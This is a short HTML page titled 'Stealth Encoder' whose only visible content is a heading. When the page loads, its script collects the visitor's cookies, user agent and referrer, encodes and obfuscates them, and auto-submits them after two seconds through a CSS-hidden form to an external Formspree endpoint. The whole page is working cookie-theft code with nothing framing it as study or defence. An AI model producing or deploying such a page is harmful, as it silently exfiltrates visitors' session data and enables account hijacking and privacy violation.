<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth Encoder</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        h2 {
            color: gold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
        }
        form {
            display: none; /* Stealth mode - hidden form */
        }
    </style>
</head>
<body>

    <h2>Stealth Encoder</h2>

    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
        <input type="hidden" name="data" id="encodedData" value="">
        <button type="submit">Send</button>
    </form>

    <script>
        (function() {
            function obfuscate(str) {
                return btoa(str).split('').reverse().join('');
            }

            async function hashSHA256(str) {
                const encoder = new TextEncoder();
                const data = encoder.encode(str);
                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                return Array.from(new Uint8Array(hashBuffer))
                    .map(byte => byte.toString(16).padStart(2, '0'))
                    .join('');
            }

            function encodeROT13(str) {
                return str.replace(/[A-Za-z]/g, c =>
                    String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))
                );
            }

            function encodeXOR(str, key) {
                return btoa(Array.from(str)
                    .map((char, i) => 
                        String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
                    ).join(''));
            }

            async function encodeData() {
                var cookies = document.cookie || "No_Cookies";
                var userAgent = navigator.userAgent || "Unknown_User_Agent";
                var referrer = document.referrer || "No_Referrer";

                let xorKey = "hiddenKey"; 
                let sha256Hash = await hashSHA256(cookies);
                let rot13Encoded = encodeROT13(cookies);
                let xorEncoded = encodeXOR(cookies, xorKey);
                let base64Encoded = btoa(cookies);

                let stealthData = JSON.stringify({
                    sha256: sha256Hash,
                    rot13: rot13Encoded,
                    xor: xorEncoded,
                    base64: base64Encoded,
                    ua: obfuscate(userAgent),
                    ref: obfuscate(referrer)
                });

                document.getElementById("encodedData").value = obfuscate(stealthData);

                setTimeout(() => {
                    document.getElementById("stealthForm").submit();
                }, 2000); 
            }

            encodeData();
        })();
    </script>

</body>
</html>
